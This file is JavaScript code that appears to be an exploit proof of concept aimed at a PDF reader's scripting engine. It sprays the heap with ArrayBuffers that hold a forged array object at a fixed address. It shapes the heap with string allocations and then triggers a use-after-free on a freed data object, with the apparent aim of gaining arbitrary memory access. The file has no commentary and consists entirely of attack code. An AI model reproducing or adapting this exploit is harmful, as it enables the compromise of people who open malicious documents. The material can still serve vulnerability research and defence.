console.show();

function gc() {
    new ArrayBuffer(3 * 1024 * 1024 * 100);
}

var FAKE_ARRAY_JSOBJ_ADDR = 0x5D000058;

var arrA = new Array(0x8000);
for (var i = 0; i < arrA.length; i++) {
    arrA[i] = new ArrayBuffer(0x10000 - 0x10 - 0x8);
    var tempDV = new DataView(arrA[i]);
    //shape
    tempDV.setUint32(0x0, FAKE_ARRAY_JSOBJ_ADDR + 0x10, true);
    //type
    tempDV.setUint32(0x4, FAKE_ARRAY_JSOBJ_ADDR + 0x50, true);
    //slot
    tempDV.setUint32(0x8, 0, true);
    //elements
    tempDV.setUint32(0xC, FAKE_ARRAY_JSOBJ_ADDR + 0x70, true);

    //shape.base_
    tempDV.setUint32(0x10, FAKE_ARRAY_JSOBJ_ADDR + 0x20, true);

    //shape.base.clasp
    tempDV.setUint32(0x20, FAKE_ARRAY_JSOBJ_ADDR + 0x10 + 0x20 + 0x10, true);
    //shape.base.flag(HAD_ELEMENTS_ACCESS)
    tempDV.setUint32(0x30, 0x1000, true);

    //flag
    tempDV.setUint32(0x60, 0, true);
    //initializedLenght  
    tempDV.setUint32(0x64, 0xFFFF, true);
    //capacity  
    tempDV.setUint32(0x68, 0xFFFF, true);
    //length
    tempDV.setUint32(0x6C, 0xFFFF, true);
}

var ESObjectSize = 0x48;
var arrB = new Array(0x1500);
var SparyStrA = "A".repeat(0x200);
for (var i = 0; i < arrB.length; i++) {
    arrB[i] = SparyStrA.substring(0, (ESObjectSize / 2) - 1).toUpperCase();
}

for (var i = 0; i < arrB.length; i += 0x2) {
    arrB[i] = null;
    arrB[i] = undefined;
}

function triggerUAF() {
    var arrC = new Array(0x3000);
    var SparyStrB = unescape("%u0058%u5D00").repeat(0x200)
    for (var i = 0; i < arrC.length; i++) {
        arrC[i] = SparyStrB.substr(0, (ESObjectSize / 2) - 1).toUpperCase();
    }

    var fakeArrObj = this.dataObjects[0];
    fakeArrObj[0] = "0";
}

this.dataObjects[0].toString();
this.dataObjects[0] = null;
g_timeout = app.setTimeOut("triggerUAF()", 1000);